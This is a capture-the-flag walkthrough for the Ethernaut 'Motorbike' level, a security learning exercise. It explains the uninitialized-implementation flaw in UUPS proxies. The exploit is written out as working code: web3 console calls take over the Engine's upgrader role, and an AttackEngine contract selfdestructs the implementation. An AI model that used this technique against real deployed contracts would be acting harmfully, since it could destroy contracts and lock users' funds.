---
description: EIP-1967 and UUPS pattern
---

# 25 - Motorbike

Ethernaut Level25: [Motorbike](https://ethernaut.openzeppelin.com/level/0x9b261b23cE149422DE75907C6ac0C30cEc4e652A)

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

### Goal of this level

* `selfdestruct` **`Engine`** contract

### What you should know before

* EIP-1967\
  \-> see [here](https://eips.ethereum.org/EIPS/eip-1967) and [here](https://youtu.be/JEt3dBHB73U)
* UUPS pattern\
  \-> see [here](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786)

## Solution

<details>

<summary>Key to solve this problem 🔑</summary>

The implementation contract has not been initialized yet!

</details>

The goal is to selfdestruct **`Engine`** contract.\
(**`Engine`**, not **`Motorbike`**)

To do that, we will have to `delegatecall` to a function that runs `selfdestruct`.

```solidity
// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
function _upgradeToAndCall(
    address newImplementation,
    bytes memory data
) internal {
    // Initial upgrade and setup call
    _setImplementation(newImplementation);
    if (data.length > 0) {
        (bool success,) = newImplementation.delegatecall(data);
        require(success, "Call failed");
    }
}
```

We will pass in the address of our exploit contract and make it call a function that selfdestructs.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity < 0.7.0;

contract AttackEngine {
    function attack() external {
        selfdestruct(address(0));
    }    
}
```

This will be our exploit contract.

```solidity
// Upgrade the implementation of the proxy to `newImplementation`
// subsequently execute the function call
function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
    _authorizeUpgrade();
    _upgradeToAndCall(newImplementation, data);
}

// Restrict to upgrader role
function _authorizeUpgrade() internal view {
    require(msg.sender == upgrader, "Can't upgrade");
}
```

to call **`_upgradeToAndCall`** function, we must call **`upgradeToAndCall`** function.

And it requires us to be `upgrader`.



The provided instance is an instance of **`Motorbike`**.

At slot `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`,  the address of implementation contract (instance of **`Engine`** contract here) is stored.

```javascript
> await web3.eth.getStorageAt(contract.address, web3.utils.hexToNumberString("0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"));
// '0x000000000000000000000000e9b1a344a91c338da1873a7698cf3a30572eab4e' -> Engine contract address
```

Since Engine contract inherits [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) contract, its storage layout will be like this:

* slot0:  `upgrader` /`initializing` (bool) /`initialized` (bool) /&#x20;
* slot1: `horsePower`

Note that first 3 variables are packed.\
(If you don't know about variable packing, see [here](https://fravoll.github.io/solidity-patterns/tight\_variable\_packing.html))

```javascript
> const engineAddr = "0xe9b1a344a91c338da1873a7698cf3a30572eab4e";

> await web3.eth.getStorageAt(engineAddr, 0);
// '0x0000000000000000000000000000000000000000000000000000000000000000'

> await web3.eth.getStorageAt(engineAddr, 1);
// '0x0000000000000000000000000000000000000000000000000000000000000000'
```

Here we can see that Engine contract hasn't been initialized yet.\
(If it had been initialized, the value of initialized should be `true`)

So we will call initialize() function and initialize `upgrader` to be `player`.

```javascript
> await web3.eth.sendTransaction({
    from: player,
    to: engineAddr,
    data: web3.eth.abi.encodeFunctionSignature("initialize()")
});

> await web3.eth.getStorageAt(engineAddr, 0);
// '0x0000000000000000000034b4ab0479d10fdbaa3b52c8371c7b1be5c73bb70001'
// player/initializing/initialized
```



Now, we will update `newImplemantation` to our exploit contract address and delegatecall `attack()` function.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity < 0.7.0;

contract AttackEngine {
    function attack() external {
        selfdestruct(address(0));
    }    
}

// 0x70538eB3d582E65a53E7594671B9BBe4C65bc9b5
```



```javascript
> const attackEngineAddr = "0x70538eB3d582E65a53E7594671B9BBe4C65bc9b5";

> const upgradeToAndCallInterface = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [{
        type: 'address',
        name: 'newImplementation'
    },{
        type: 'bytes',
        name: 'data'
    }]
};

> const functionCalldata = web3.eth.abi.encodeFunctionCall(
    upgradeToAndCallInterface,
    [
        attackEngineAddr,
        web3.eth.abi.encodeFunctionSignature("attack()")
    ]
);

> await web3.eth.sendTransaction({
    from: player,
    to: engineAddr,
    data: functionCalldata
});
```

Done! 😎

